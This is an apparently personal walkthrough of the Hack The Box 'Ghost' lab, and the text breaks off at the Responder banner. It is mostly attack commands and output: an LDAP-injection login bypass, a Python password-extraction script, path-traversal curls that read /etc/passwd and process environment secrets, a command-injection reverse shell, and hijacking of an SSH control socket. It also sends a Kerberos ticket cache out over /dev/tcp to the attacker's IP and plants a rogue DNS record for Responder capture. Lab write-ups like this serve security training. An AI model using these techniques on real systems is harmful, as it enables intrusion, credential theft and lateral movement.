![Ghost](/HTB-Portfolio/images/pwndghost.png)
```shell
nmap -A -T4 --min-rate 10000 -Pn -p- -oN nmap.txt 10.129.8.170                                                         
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 21:51 +0000
Nmap scan report for 10.129.8.170
Host is up (0.094s latency).
Not shown: 65509 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-18 21:51:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.8.170:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-03-18T21:53:23+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-18T21:49:25
|_Not valid after:  2056-03-18T21:49:25
| ms-sql-ntlm-info: 
|   10.129.8.170:1433: 
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-18T21:52:44+00:00
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2026-03-17T21:46:37
|_Not valid after:  2026-09-16T21:46:37
|_ssl-date: 2026-03-18T21:53:23+00:00; +3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8008/tcp  open  http          nginx 1.18.0 (Ubuntu)
|_http-title: Ghost
|_http-generator: Ghost 5.78
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
8443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
| http-title: 400 The plain HTTP request was sent to HTTPS port
|_Requested resource was /login
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
9389/tcp  open  mc-nmf        .NET Message Framing
49443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49990/tcp open  msrpc         Microsoft Windows RPC
55568/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-18T21:52:44
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   93.83 ms 10.10.14.1
2   94.24 ms 10.129.8.170

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.21 seconds
```

add the host:
```bash
10.129.8.170 ghost.htb core.ghost.htb DC01.ghost.htb

```
on port 8008 doesnt have much so we check port 8443 running with "core" as the sub but as stated in the nmap scan we get a 400 so we run ffuf:
```ffuf
ffuf -u https://core.ghost.htb:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -k

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://core.ghost.htb:8443/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

Login                   [Status: 200, Size: 1064, Words: 210, Lines: 33, Duration: 689ms]
login                   [Status: 200, Size: 1064, Words: 210, Lines: 33, Duration: 258ms]
public                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 180ms]
:: Progress: [4750/4750] :: Job [1/1] :: 19 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```
also lets check gobuster:
```gobuster
gobuster dns --do ghost.htb --resolver 10.129.231.105 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     ghost.htb
[+] Threads:    10
[+] Resolver:   10.129.231.105
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
intranet.ghost.htb ::ffff:10.129.231.105
corp.ghost.htb ::ffff:10.129.231.105
core.ghost.htb ::ffff:10.129.231.105
gitea.ghost.htb 127.0.0.1
domaindnszones.ghost.htb 10.129.231.105,10.0.0.254
forestdnszones.ghost.htb 10.129.231.105,10.0.0.10,10.0.0.254
```
so in burp we got to the "/login" dir and also making sure its a "HTTPS"  request but after clicking on "Login using AD Federation" we see where in burp its sending the request:
```Burp
GET /adfs/ls/?SAMLRequest=nVNNc9owEP0rHt3xJzhUg8kQcygzSeoBN4dcMkJaB8%2FIkqtdJ%2FTfd2xww6HlwFVv9%2B3bt0%2BL%2B2OjvQ9wWFuTscgP2f1ygaLRLV91dDBb%2BNUBkndstEE%2BABnrnOFWYI3ciAaQk%2BS71dMjj%2F2Qt86SlVYzb7PO2Fscz6p5lYoEonk1k3Iq1F6FIpnulYiiOylBhfMq%2Fca8l1FE7IfM2yB2sDFIwlDG4jBOJ2EyicMyjvjsjiepH6XpK%2FOK87iH2qjavF%2FXtj8VIf9elsWk%2BLErmbcGpNoIGkYfiFrkQVCBAje8%2Be8Hi%2BQfaB8IVWGgMWDeChFcj%2BbWYNeA24H7qCX83D5%2BcUjr4Kubz6fT5ETRmxi0FmkL2FqDwE6O82Fnd2H19W3EqIItr8xcBBfc42mfRQObdWF1LX%2FfctqV1vYzdyAIMkauAxaM1OfAgBrik1tDcLwpPrltWuFq7O8CRyFptOmSONcCcQvVLaZdLZNc9tSAvBCIn9apPmkgCVTphMHWOjpb%2By89yxP2Hzv%2BopdfbPkH&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=NT7JyGmKu2JhzaVhpnQQ1SI3tGq6BGHDyOlpxN2V8PgUXzQRTCKpaqpFsKMou3tp59AVf57NerZRr4WFXxDYXef%2BTw2eGxI9not9lWhQfb0HIm%2FF7KrI0r%2B0a19p38sRRYIuogeGXytlA3NfIQYJC7qwy0m%2Fj0M1Nlvi2EXHj63mtf7a%2B0Mw017DJJO4Js%2FaOBjfjYXf%2Flv4dnakMyPHJnKVCP3h4iihIYxCSgkck%2FFw7R%2BP4mYyz7yn5LVoGIdp7frhxXX4FTUDn2%2B%2Fw8RjKHImhtAO7Y3uI%2Fsh%2FgbataA4yZmmaClj%2BkH1Q1YLFKK26oJdyE4PMTd3ox9X6U5JBA%3D%3D HTTP/1.1
Host: federation.ghost.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://core.ghost.htb:8443/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

```

notice the host"
`federation.ghost.htb`
so we add it to our hosts file and with that we land on the loginscren:

![[Pasted image 20260320151134.png]]

inside burp i checked my login request and i noticed it was sending ldap request so i changed the username and the secret to `*` and that logged me in.

```burp
POST /login HTTP/1.1
Host: intranet.ghost.htb:8008
Content-Length: 826
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Next-Action: c471eb076ccac91d6f828b671795550fd5925940
Accept-Language: en-US,en;q=0.9
Accept: text/x-component
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyH8dOuT4Mz6uGAui
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Origin: http://intranet.ghost.htb:8008
Referer: http://intranet.ghost.htb:8008/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryyH8dOuT4Mz6uGAui
Content-Disposition: form-data; name="1_$ACTION_REF_1"


------WebKitFormBoundaryyH8dOuT4Mz6uGAui
Content-Disposition: form-data; name="1_$ACTION_1:0"

{"id":"c471eb076ccac91d6f828b671795550fd5925940","bound":"$@1"}
------WebKitFormBoundaryyH8dOuT4Mz6uGAui
Content-Disposition: form-data; name="1_$ACTION_1:1"

[{}]
------WebKitFormBoundaryyH8dOuT4Mz6uGAui
Content-Disposition: form-data; name="1_$ACTION_KEY"

k2982904007
------WebKitFormBoundaryyH8dOuT4Mz6uGAui
Content-Disposition: form-data; name="1_ldap-username"

*
------WebKitFormBoundaryyH8dOuT4Mz6uGAui
Content-Disposition: form-data; name="1_ldap-secret"

*
------WebKitFormBoundaryyH8dOuT4Mz6uGAui
Content-Disposition: form-data; name="0"

[{},"$K1"]
------WebKitFormBoundaryyH8dOuT4Mz6uGAui--

```
![[Pasted image 20260320160328.png]]
we also have a users list:
![[Pasted image 20260320162854.png]]made a python script to automate the ldap inject so we can see the password in cleartext:
```python
import requests
import string

url = "http://intranet.ghost.htb:8008/login"
charset = string.ascii_letters + string.digits + "!@#$%^&+-_"
found = "szrr8"

headers = {
    "Next-Action": "c471eb076ccac91d6f828b671795550fd5925940",
    "Content-Type": "application/x-www-form-urlencoded",
}

def try_login(secret):
    data = f'1_ldap-username=gitea_temp_principal&1_ldap-secret={secret}&0=[{{}},"$K1"]'
    r = requests.post(url, headers=headers, data=data, allow_redirects=False)
    return r.status_code == 303 and "token" in r.headers.get("Set-Cookie", "")

while True:
    # First check if current 'found' is already the complete password
    if try_login(found):
        print(f"[+] Complete password: {found}")
        break
    
    found_char = False
    for char in charset:
        if try_login(found + char + "*"):
            found += char
            print(f"[+] Found so far: {found}")
            found_char = True
            break
    
    if not found_char:
        print(f"[+] Complete password: {found}")
        break
```
we get the password and now we have creds:

`gitea_temp_principal:szrr8kpc3z6onlqf`
we use these creds to log into `gitea.ghost.htb`:
![[Pasted image 20260322195652.png]]

so from here lets check out the 2 links `blog` & `intranet`. During the examination of the files we stumble across a main.rs, dev.rs, and a scan.rs:
main.rs:
```Ruby
#[macro_use]
extern crate rocket;

use rocket::http::Method;
use rocket::Request;
use rocket::serde::json::Json;
use rocket_cors::AllowedOrigins;

mod api;
mod database;

#[catch(401)]
fn not_authorized(_req: &Request) -> Json<()> {
    Json(())
}

#[launch]
fn rocket() -> _ {
    dotenv::dotenv().ok();

    let cors = rocket_cors::CorsOptions {
        allowed_origins: AllowedOrigins::all(),
        allowed_methods: vec![Method::Get, Method::Post].into_iter().map(From::from).collect(),
        allow_credentials: true,
        ..Default::default()
    }.to_cors().unwrap();

    rocket::build()
        .mount("/api", routes![
            api::login::login,
            api::news::get_news,
            api::users::get_users,
            api::me::get_me,
            api::forum::get_forum,
        ])
        .mount("/api-dev", routes![
            api::dev::scan::scan
        ])
        .attach(cors)
        .register("/", catchers![not_authorized])
}
```
dev.rs:
```Ruby
use rocket::http::Status;
use rocket::Request;
use rocket::request::{FromRequest, Outcome};

pub(crate) mod scan;

pub struct DevGuard;

#[rocket::async_trait]
impl<'r> FromRequest<'r> for DevGuard {
    type Error = ();

    async fn from_request(request: &'r Request<'_>) -> Outcome<Self, Self::Error> {
        let key = request.headers().get_one("X-DEV-INTRANET-KEY");
        match key {
            Some(key) => {
                if key == std::env::var("DEV_INTRANET_KEY").unwrap() {
                    Outcome::Success(DevGuard {})
                } else {
                    Outcome::Error((Status::Unauthorized, ()))
                }
            },
            None => Outcome::Error((Status::Unauthorized, ()))
        }
    }
}
```
and scan.rs:
```Ruby
use std::process::Command;

use rocket::serde::json::Json;
use rocket::serde::Serialize;
use serde::Deserialize;

use crate::api::dev::DevGuard;

#[derive(Deserialize)]
pub struct ScanRequest {
    url: String,
}

#[derive(Serialize)]
pub struct ScanResponse {
    is_safe: bool,
    // remove the following once the route is stable
    temp_command_success: bool,
    temp_command_stdout: String,
    temp_command_stderr: String,
}

// Scans an url inside a blog post
// This will be called by the blog to ensure all URLs in posts are safe
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    // currently intranet_url_check is not implemented,
    // but the route exists for future compatibility with the blog
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();

    match result {
        Ok(output) => {
            Json(ScanResponse {
                is_safe: true,
                temp_command_success: true,
                temp_command_stdout: String::from_utf8(output.stdout).unwrap_or("".to_string()),
                temp_command_stderr: String::from_utf8(output.stderr).unwrap_or("".to_string()),
            })
        }
        Err(_) => Json(ScanResponse {
            is_safe: true,
            temp_command_success: false,
            temp_command_stdout: "".to_string(),
            temp_command_stderr: "".to_string(),
        })
    }
}
```
our scripts show that "scan" does some type of rce on the end point of the api and to make this work we also need the "DEV_INTRANET_KEY", so with a quick google search we get the doc for ghost CMS since it seems that ghost is running as a content manager and it pulls ruby files.
https://docs.ghost.org/content-api
so going back to the Blog repo we see some details on the README.md:
![[Pasted image 20260322200519.png]]
so we need to add our key to our request and see what we can get. we need to get some type of file disclosure so looking at the "post-public.js" file we see that this has a "extra" function if we can call out to it
post-public.js:
```JSON
const posts = await postsService.browsePosts(options);
            const extra = frame.original.query?.extra;
            if (extra) {
                const fs = require("fs");
                if (fs.existsSync(extra)) {
                    const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
                    posts.meta.extra = { [extra]: fileContent };
                }
            }
            return posts;
```

so with all of this we send out payload and which we see the `etc/passwd`:
![[Pasted image 20260322201222.png]]
```Bash
curl -s -q 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../../../../../../etc/passwd' | jq .meta.extra[] -r
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000:Linux User,,,:/home/node:/bin/sh
```

And we also get the environment:
```Bash
curl -s -q 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../../../../../../proc/self/environ' | jq .meta.extra[] -r | sed 's/\x00/\r\n/g'
HOSTNAME=26ae7990f3dd
database__debug=false
YARN_VERSION=1.22.19
PWD=/var/lib/ghost
NODE_ENV=production
database__connection__filename=content/data/ghost.db
HOME=/home/node
database__client=sqlite3
url=http://ghost.htb
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
database__useNullAsDefault=true
GHOST_CONTENT=/var/lib/ghost/content
SHLVL=0
GHOST_CLI_VERSION=1.25.3
GHOST_INSTALL=/var/lib/ghost
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE_VERSION=18.19.0
GHOST_VERSION=5.78.0
```
so now that we have our "DEV_INTRANET_KEY" lets try and add it to our request and see if we can get a revshell:
![[Pasted image 20260322205437.png]]![[Pasted image 20260322205458.png]]

We have a shell:
```Bash
rlwrap nc -lvnp 4444                                                                        
listening on [any] 4444 ...
connect to [10.10.15.113] from (UNKNOWN) [10.129.10.74] 49902
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@36b733906694:/app# id
id
uid=0(root) gid=0(root) groups=0(root)
root@36b733906694:/app# cat /docker-entrypoint.sh
cat /docker-entrypoint.sh
#!/bin/bash

mkdir /root/.ssh
mkdir /root/.ssh/controlmaster
printf 'Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n  ControlPersist yes' > /root/.ssh/config

exec /app/ghost_intranet
root@36b733906694:/app# ps -ef --forest
ps -ef --forest
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 02:19 ?        00:00:00 /app/ghost_intranet
root          18       1  0 02:20 ?        00:00:00 [ssh] <defunct>
root          19       1  0 02:20 ?        00:00:00 ssh: /root/.ssh/controlmaste
root         493       1  0 03:26 ?        00:00:00 bash -c intranet_url_check ;
root         495     493  0 03:26 ?        00:00:00  \_ bash -i
root         675     495  0 03:50 ?        00:00:00      \_ python3 -c import pt
root         676     675  0 03:50 pts/0    00:00:00          \_ /bin/bash
root         716     676  0 03:55 pts/0    00:00:00              \_ ps -ef --for
root@36b733906694:/app# ls /root/.ssh/controlmaster
ls /root/.ssh/controlmaster
florence.ramirez@ghost.htb@dev-workstation:22
root@36b733906694:/app# ssh florence.ramirez@ghost.htb@dev-workstation
ssh florence.ramirez@ghost.htb@dev-workstation
Last login: Thu Feb  1 23:58:45 2024 from 172.18.0.1
florence.ramirez@LINUX-DEV-WS01:~$ id    id
id
uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
florence.ramirez@LINUX-DEV-WS01:~$  
```

Florence is part of some type of Active Directory so lets grab his cache file:

```bash
florence.ramirez@LINUX-DEV-WS01:~$ klist klist
klist
Ticket cache: FILE:/tmp/krb5cc_50
Default principal: florence.ramirez@GHOST.HTB

Valid starting     Expires            Service principal
03/23/26 04:15:01  03/23/26 14:15:01  krbtgt/GHOST.HTB@GHOST.HTB
        renew until 03/24/26 04:15:01
florence.ramirez@LINUX-DEV-WS01:~$ ls -lals -lah /tmp
ls -lah /tmp
total 32K
drwxrwxrwt 1 root             root  4.0K Mar 23 04:16 .
drwxr-xr-x 1 root             root  4.0K Mar 23 02:19 ..
-rw-r--r-- 1 root             root     0 Feb  1  2024 init_success
-rw------- 1 florence.ramirez staff 1.7K Mar 23 04:16 krb5cc_50
-rw------- 1 root             root   580 Mar 23 02:19 nmbd-stdout---supervisor-tbtpc4c_.log
-rw------- 1 root             root   14K Mar 23 03:57 winbind-stdout---supervisor-1utwitsg.log
florence.ramirez@LINUX-DEV-WS01:~$ cd /tmcd /tmp
cd /tmp
florence.ramirez@LINUX-DEV-WS01:/tmp$ ls    ls
ls
init_success  nmbd-stdout---supervisor-tbtpc4c_.log
krb5cc_50     winbind-stdout---supervisor-1utwitsg.log
florence.ramirez@LINUX-DEV-WS01:/tmp$ base64base64 krb5cc_50 > /dev/tcp/10.10.15.113/9001
base64 krb5cc_50 > /dev/tcp/10.10.15.113/9001
florence.ramirez@LINUX-DEV-WS01:/tmp$
```

we grab our file:
```Bash
rlwrap nc -lvnp 9001 > florence.ramirez.ccache
listening on [any] 9001 ...
connect to [10.10.15.113] from (UNKNOWN) [10.129.10.74] 49928
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Ghost]
└─$ mv florence.ramirez.ccache florence.ramirez.ccache.b64

┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Ghost]
└─$ klist      
klist: No credentials cache found (filename: /tmp/krb5cc_1000)

┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Ghost]
└─$ base64 -d florence.ramirez.ccache.b64 > /tmp/krb5cc_1000                       

┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Ghost]
└─$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: florence.ramirez@GHOST.HTB

Valid starting       Expires              Service principal
03/23/2026 04:20:01  03/23/2026 14:20:01  krbtgt/GHOST.HTB@GHOST.HTB
        renew until 03/24/2026 04:20:01
```

lets check if we can authenticate with the cache:

```bash
export KRB5CCNAME=/tmp/krb5cc_1000
nxc smb 10.129.10.74 --use-kcache  
SMB         10.129.10.74    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.10.74    445    DC01             [+] GHOST.HTB\florence.ramirez from ccache 
```

so now we run rusthound-ce:

```bash
rusthound-ce -f dc01.ghost.htb -d ghost.htb -u florence.ramirez -k -no-pass -i 10.129.10.74 -c All -z
---------------------------------------------------
Initializing RustHound-CE at 05:57:29 on 03/23/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-03-23T05:57:29Z INFO  rusthound_ce] Verbosity level: Info
[2026-03-23T05:57:29Z INFO  rusthound_ce] Collection method: All
[2026-03-23T05:57:30Z INFO  rusthound_ce::ldap] Connected to GHOST.HTB Active Directory!
[2026-03-23T05:57:30Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-03-23T05:57:30Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-23T05:57:31Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ghost,DC=htb
[2026-03-23T05:57:31Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-23T05:57:33Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=ghost,DC=htb
[2026-03-23T05:57:33Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-23T05:57:35Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=ghost,DC=htb
[2026-03-23T05:57:35Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-23T05:57:35Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=ghost,DC=htb
[2026-03-23T05:57:35Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-23T05:57:35Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=ghost,DC=htb
[2026-03-23T05:57:35Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-03-23T05:57:35Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-03-23T05:57:35Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-03-23T05:57:35Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-03-23T05:57:35Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-03-23T05:57:35Z INFO  rusthound_ce::json::maker::common] 17 users parsed!
[2026-03-23T05:57:35Z INFO  rusthound_ce::json::maker::common] 65 groups parsed!
[2026-03-23T05:57:35Z INFO  rusthound_ce::json::maker::common] 2 computers parsed!
[2026-03-23T05:57:35Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-03-23T05:57:35Z INFO  rusthound_ce::json::maker::common] 2 domains parsed!
[2026-03-23T05:57:35Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-03-23T05:57:35Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-03-23T05:57:35Z INFO  rusthound_ce::json::maker::common] .//20260323055735_ghost-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 05:57:35 on 03/23/26! Happy Graphing!
```

and here is our krb5.conf file:
```bash
cat /etc/krb5.conf
[libdefaults]
    default_realm = GHOST.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    GHOST.HTB = {
        kdc = 10.129.10.74
        admin_server = 10.129.10.74
    }

[domain_realm]
    .ghost.htb = GHOST.HTB
    ghost.htb = GHOST.HTB
```

and here we checked a few thing but nothing so after going back to intranet we see a forum by just stating some thing about `bitbucket` so we add the subdomain to our records:
```bash
┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Ghost]
└─$ klist                                                   
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: florence.ramirez@GHOST.HTB

Valid starting       Expires              Service principal
03/23/2026 17:24:01  03/24/2026 03:24:01  krbtgt/GHOST.HTB@GHOST.HTB
        renew until 03/24/2026 17:24:01

┌──(nt0wl㉿kali)-[~/Machines/HackTheBox/Ghost]
└─$ dnstool -u "ghost.htb\florence.ramirez" -k -a add -r bitbucket -d 10.10.15.113 --zone ghost.htb -dns-ip 10.129.10.74 dc01.ghost.htb                               
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

```

so now lets set up responder:
```bash
sudo responder -I tun0
[sudo] password for nt0wl: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

